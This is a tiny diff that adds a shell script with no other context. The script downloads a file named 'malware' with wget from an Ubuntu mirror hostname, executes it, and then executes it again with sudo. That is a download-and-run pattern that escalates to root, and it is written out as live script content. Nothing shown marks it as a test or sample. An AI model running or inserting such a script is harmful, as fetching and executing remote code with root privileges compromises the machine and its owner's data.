@@ -1,0 +1,5 @@
+#!/bin/sh
+echo "DOWNLOAD"
+wget nl.archive.ubuntu.com/malware
+./malware
+sudo ./malware
